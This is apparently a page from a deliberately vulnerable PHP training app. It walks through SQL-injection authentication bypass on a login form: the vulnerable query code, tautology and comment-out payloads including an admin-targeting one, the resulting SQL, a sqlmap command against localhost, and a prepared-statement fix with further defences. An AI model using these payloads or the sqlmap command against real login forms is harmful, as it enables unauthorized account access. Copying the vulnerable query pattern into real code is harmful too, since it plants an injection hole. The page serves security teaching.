<?php if ( ! defined('SQL_INJECTION_IN_PHP') ) die('Direct access not permitted'); ?>

<nav aria-label="breadcrumb" class="mb-3">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="?action=walkthroughs">Walkthroughs</a></li>
    <li class="breadcrumb-item active">Authentication Bypass</li>
  </ol>
</nav>

<div class="d-flex align-items-center gap-3 mb-4">
  <h2 class="mb-0">1. Authentication Bypass</h2>
  <span class="badge bg-danger">Basic</span>
  <span class="badge bg-secondary">In-band</span>
</div>

<!-- Overview -->
<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Overview</strong></div>
  <div class="card-body">
    <p>The login form passes user input directly into a SQL query string without sanitization. An attacker can manipulate the SQL logic to authenticate without a valid password — or as any user in the database.</p>
    <p class="mb-0"><strong>Affected file:</strong> <code>db_login.php</code> | <strong>Safe counterpart:</strong> <code>db_login_safe.php</code></p>
  </div>
</div>

<!-- Vulnerable Code -->
<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white"><strong>Vulnerable Code</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>$email    = $_POST['email'];
$password = $_POST['password'];

// Raw string interpolation — both inputs go directly into the query
$sql = "SELECT * FROM user
        WHERE \`email\` = '$email'
        AND \`password\` = '$password'";

$result = mysqli_query($db, $sql);
$count  = mysqli_num_rows($result);

if ($count > 0) {
    // Login successful — session set
}</code></pre>
    <p class="mt-2 mb-0 text-danger"><strong>Problem:</strong> The attacker controls the string that becomes the WHERE clause. They can terminate the string early and rewrite the logic entirely.</p>
  </div>
</div>

<!-- Attack Walkthrough -->
<div class="card mb-4 border-warning">
  <div class="card-header bg-warning text-dark"><strong>Attack Walkthrough — Step by Step</strong></div>
  <div class="card-body">

    <h6 class="fw-bold">Step 1 — Confirm the injection point</h6>
    <p>Enter a single quote in the email field. If the app throws an error or behaves unexpectedly, the field is injectable.</p>
    <div class="bg-light p-2 rounded mb-3">
      <strong>Email:</strong> <code>'</code> &nbsp; <strong>Password:</strong> <code>anything</code>
    </div>

    <h6 class="fw-bold">Step 2 — Classic tautology bypass (login as first user)</h6>
    <p>The payload closes the email string early, adds a TRUE condition with <code>OR 1=1</code>, and comments out the rest of the query with <code>--</code>. The password check never runs.</p>
    <div class="bg-light p-2 rounded mb-1">
      <strong>Email:</strong> <code>' OR '1'='1'--</code> &nbsp; <strong>Password:</strong> <code>anything</code>
    </div>
    <p class="text-muted small mb-3">Resulting SQL: <code>SELECT * FROM user WHERE `email` = '' OR '1'='1'-- ' AND `password` = 'anything'</code></p>

    <h6 class="fw-bold">Step 3 — Login as a specific known user</h6>
    <p>If you know an email address (e.g. from a previous UNION dump), you can target that account directly:</p>
    <div class="bg-light p-2 rounded mb-1">
      <strong>Email:</strong> <code>besu@gmail.com'--</code> &nbsp; <strong>Password:</strong> <code>anything</code>
    </div>
    <p class="text-muted small mb-3">Resulting SQL: <code>SELECT * FROM user WHERE `email` = 'besu@gmail.com'--' AND `password` = 'anything'</code> — password check is commented out.</p>

    <h6 class="fw-bold">Step 4 — Login as admin without knowing any email</h6>
    <div class="bg-light p-2 rounded mb-1">
      <strong>Email:</strong> <code>' OR account_type='admin'--</code> &nbsp; <strong>Password:</strong> <code>anything</code>
    </div>
    <p class="text-muted small mb-3">Returns the first admin account row. Session is set with admin privileges.</p>

    <h6 class="fw-bold">Where to practice:</h6>
    <a href="<?= (strpos($_SERVER['REQUEST_URI'], 'profile2') !== false ? '../' : '') ?>login.php" target="_blank" class="btn btn-sm btn-outline-danger">Open Login Page →</a>
  </div>
</div>

<!-- Fix -->
<div class="card mb-4 border-success">
  <div class="card-header bg-success text-white"><strong>Fix — Parameterized Query</strong></div>
  <div class="card-body">
    <p>Use PDO prepared statements. The user input is passed as a bound parameter — it can never be interpreted as SQL, regardless of what it contains.</p>
<pre class="bg-light p-3 rounded"><code>$sql   = "SELECT * FROM \`user\` WHERE \`email\` = ? AND \`password\` = ?";
$query = $pdo->prepare($sql);
$query->execute([$email, $password]);
$row   = $query->rowCount();</code></pre>
    <p class="mb-0 text-success"><strong>Result:</strong> Even if the attacker enters <code>' OR '1'='1'--</code>, it is treated as a literal string value, not SQL. The query finds no matching row and login fails.</p>
  </div>
</div>

<!-- Additional Defences -->
<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Additional Defences</strong></div>
  <div class="card-body">
    <ul class="mb-0">
      <li><strong>Hash passwords</strong> — store <code>bcrypt</code> hashes, not plaintext. Even with a full DB dump, passwords are not immediately usable.</li>
      <li><strong>Rate limiting</strong> — limit login attempts per IP to slow brute-force and automated attacks.</li>
      <li><strong>Least privilege</strong> — the DB user the app connects with should have SELECT only on the user table, not ALTER/DROP.</li>
      <li><strong>Error handling</strong> — never show raw DB errors to users; log them server-side only.</li>
      <li><strong>MFA</strong> — even if credentials are compromised, a second factor prevents access.</li>
    </ul>
  </div>
</div>

<!-- Tools -->
<div class="card">
  <div class="card-header bg-secondary text-white"><strong>Tools to Automate This Attack</strong></div>
  <div class="card-body">
    <p class="mb-2"><strong>sqlmap — auto-detect and exploit the login form:</strong></p>
    <pre class="bg-light p-2 rounded small">sqlmap -u "http://localhost:8080/db_login.php" \
  --data="email=test&password=test" \
  --dbs --batch --level=3</pre>
    <p class="mb-2"><strong>Burp Suite — manually test payloads:</strong></p>
    <ol class="small mb-0">
      <li>Intercept the POST to <code>db_login.php</code></li>
      <li>Send to Repeater</li>
      <li>Modify the <code>email</code> parameter and observe responses</li>
    </ol>
  </div>
</div>
